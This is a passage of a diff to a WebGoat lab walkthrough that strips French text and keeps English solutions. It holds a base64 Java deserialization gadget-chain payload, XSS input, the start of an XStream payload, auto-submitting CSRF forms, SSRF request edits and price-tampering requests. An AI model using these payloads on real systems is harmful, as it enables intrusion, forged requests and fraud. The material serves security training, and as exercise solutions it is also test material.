ZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXRxAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA_____wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXNvc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQAAAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAAAAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQAhACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAoAAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEAAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg`
+```
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9
+sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHV
+lh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGp
+hdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9An
+XEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHR
+yYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5
+naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS9
+0dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJ
+uYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1s
+ADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQ
+AAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHl
+WYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJ
+hdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29
+wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHN
+yADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9
+DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3J
+nL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ
+0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ
+0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF
+0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGF
+zQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9
+wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS9
+0dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2N
+lc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3B
+pLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5
+zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3E
+AfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt
+MAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC5
+4c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnN
+sZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXR
+xAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x
+0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2x
+hbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9
+wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0x
+vcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA___
+__wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq
+-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXl
+sb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJ
+zdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAE
+AAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0
+BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9
+wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGN
+vbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGF
+jaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHR
+pb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXh
+jZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHR
+jL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWx
+pemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGV
+ybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l
+0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXp
+hdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmF
+sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2l
+udGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGd
+ldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHM
+BABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2x
+lZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXN
+vc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQ
+AAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQA
+AAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAA
+AAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAG
+xAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQA
+hACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAo
+AAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9
+HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQE
+AEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAyg
+pVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQA
+EdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQA
+MR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2F
+kZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQA
+AAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAE
+AAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
+```
 
 #### **(A9) Vulnerable Components:**
 
 ##### Vulnerable Components
 
-5. Copier-coller `Ok<script>XSS</script>` dans chaque case. 5\. Copy-paste `Ok<script>XSS</script>` in each box.
+5.
+Copy-paste `Ok<script>XSS</script>` in each box.
 
 12.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Cette leçon ne semble pas fonctionner.  This lesson does not seem to work. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  This lesson does not seem to work. 
 
-Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ pour comprendre comment cela fonctionne. Le _payload_ suivant devrait fonctionner, mais ce n'est pas le cas. For the deserialization, go to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ to read about why it works. The following payload should work.  
+For the deserialization, go to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ to read about why it works. The following payload should work.  
 
-```  
+```  xml
 <sorted-set>  
      <string>foo</string>  
      <dynamic-proxy>  
@@ -942,9 +1054,9 @@ Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try creating a local page or one that is uploaded and points to this form as its action.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The trigger can be manual or scripted to happen automatically
 
-Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur. Save the following code in a file **csrf.html** and open it in a web browser.  
+Save the following code in a file **csrf.html** and open it in a web browser.  
 
-``` 
+```html
 <form name="attack" action="http://host:port/WebGoat/csrf/basic-get-flag" method="POST">  
      <input type="hidden" name='csrf' value='true'>  
 </form>  
@@ -956,9 +1068,9 @@ Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un na
 ![Hint](images/wiki_owasp_webgoat/hint.png) Remember, you need to mimic the existing workflow/form.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) This one has a weak anti-CSRF protection, but you do need to overcome (mimic) it
 
-Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur. Save the following code in a file **csrf.html** and open it in a web browser.  
+Save the following code in a file **csrf.html** and open it in a web browser.  
 
-``` 
+```html
 <form name="attack" action="http://host:port/WebGoat/csrf/review" method="POST">  
      <input type="hidden" name='reviewText' value='This App Rocks'>  
      <input type="hidden" name='stars' value='5'>  
@@ -972,9 +1084,9 @@ Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un na
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try to post the same message with content-type text/plain  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The json can be put into a hidden field inside
 
-Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur. Save the following code in a file **csrf.html** and open it in a web browser.  
+Save the following code in a file **csrf.html** and open it in a web browser.  
 
-``` 
+```html
 <form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST">  
      <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>  
 </form>  
@@ -986,7 +1098,7 @@ Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un na
 ![Hint](images/wiki_owasp_webgoat/hint.png) Create a form which will log you in as this user (hint 1) and upload it to WebWolf  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Visit this assignment again
 
-Suivre les instructions. Follow the instructions.
+Follow the instructions.
 
 ##### Server-Side Request Forgeries
 
@@ -994,20 +1106,20 @@ Suivre les instructions. Follow the instructions.
 ![Hint](images/wiki_owasp_webgoat/hint.png) You should use an HTTP proxy to intercept the request and change the URL.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) If Tom is images/tom.png, Jerry would be images/jerry.png.
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **Steal the Cheese**. On **WebGoat** click on **Steal the Cheese**.
-*   Repérer la requête vers `task1` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_. Locate the query to `task1` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en `url=images/jerry.png`, et la renvoyer. Modify the body of the request with `url=images/jerry.png` and send it again.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on **Steal the Cheese**.
+*   Locate the query to `task1` in the _Network_ tab and click on _Edit and Resend_.
+*   Modify the body of the request with `url=images/jerry.png` and send it again.
 
 ![SSRF 2](images/wiki_owasp_webgoat/ssrf-2.png)
 
 3.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) You need to put the protocol, "http://" in front of ifconfig.pro.
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **Steal the Cheese**. On **WebGoat** click on **Steal the Cheese**.
-*   Repérer la requête vers `task2` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_. Locate the query to `task2` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en `url=http://ifconfig.pro`, et la renvoyer. Modify the body of the request with `url=http://ifconfig.pro` and send it again.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on **Steal the Cheese**.
+*   Locate the query to `task2` in the _Network_ tab and click on _Edit and Resend_.
+*   Modify the body of the request with `url=http://ifconfig.pro` and send it again.
 
 ![SSRF 3](images/wiki_owasp_webgoat/ssrf-3.png)
 
@@ -1016,18 +1128,18 @@ Suivre les instructions. Follow the instructions.
 ##### Bypass front-end restrictions
 
 2.
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **submit** sans toucher aux paramètres. On **WebGoat** click on **submit** without editing the parameters.
-*   Repérer la requête vers `FieldRestrictions` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_. Locate the query to `FieldRestrictions` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en `select=option3&radio=option3&checkbox=a&shortInput=123456`, et la renvoyer. Modify the body of the request with `select=option3&radio=option3&checkbox=a&shortInput=123456` and send it again.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on **submit** without editing the parameters.
+*   Locate the query to `FieldRestrictions` in the _Network_ tab and click on _Edit and Resend_.
+*   Modify the body of the request with `select=option3&radio=option3&checkbox=a&shortInput=123456` and send it again.
 
 ![BFER 1](images/wiki_owasp_webgoat/bfer-1.png)
 
 3.
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **submit** sans toucher aux paramètres. On **WebGoat** click on **submit** without editing the parameters.
-*   Repérer la requête vers `frontendValidation` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_. Locate the query to `frontendValidation` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en `field1=abcz&field2=123z&field3=abc+123+ABC'z&field4=sevenz&field5=01101z&field6=90210-1111z&field7=301-604-4882z&error=0`, et la renvoyer. Modify the body of the request with `field1=abcz&field2=123z&field3=abc+123+ABC'z&field4=sevenz&field5=01101z&field6=90210-1111z&field7=301-604-4882z&error=0` and send it again.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on **submit** without editing the parameters.
+*   Locate the query to `frontendValidation` in the _Network_ tab and click on _Edit and Resend_.
+*   Modify the body of the request with `field1=abcz&field2=123z&field3=abc+123+ABC'z&field4=sevenz&field5=01101z&field6=90210-1111z&field7=301-604-4882z&error=0` and send it again.
 
 ![BPFER 3](images/wiki_owasp_webgoat/bpfer-3.png)
 
@@ -1038,10 +1150,10 @@ Suivre les instructions. Follow the instructions.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Is the price part of the HTML request?  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Intercept the request and manipulate the price before submitting it.
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **Chekout** sans toucher aux paramètres. On **WebGoat** click on **Chekout** without editing the parameters.
-*   Repérer la requête vers `task` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_. Locate the query to `task` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en `QTY=2&Total=0`, et la renvoyer. Modify the body of the request with `QTY=2&Total=0` and send it again.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on **Chekout** without editing the parameters.
+*   Locate the query to `task` in the _Network_ tab and click on _Edit and Resend_.
+*   Modify the body of the request with `QTY=2&Total=0` and send it again.
 
 ![HTML Tampering](images/wiki_owasp_webgoat/html-tampering-2.png)
 
@@ -1053,9 +1165,9 @@ Suivre les instructions. Follow the instructions.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Examine the hidden table to see if there is anyone listed who is not in the drop down menu.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look in the last row of the hidden table.
 
-*   Effectuer un clic-droit sur l'élément défilant **Select user**, et cliquer sur _Examiner l'élément_. Right-click on the **Select user** scrolling element, and click on _Inspect Element_
-*   Juste en dessous dans le HTML, on trouve un tableau caché, dans lequel les informations sur Neville Bartholomew sont présentes. Just below in the HTML, there is a hidden table, in which information about Neville Bartholomew is present.
-*   Son salaire est de 450000. Its salary is 450000.
+*   Right-click on the **Select user** scrolling element, and click on _Inspect Element_
+*   Just below in the HTML, there is a hidden table, in which information about Neville Bartholomew is present.
+*   Its salary is 450000.
 
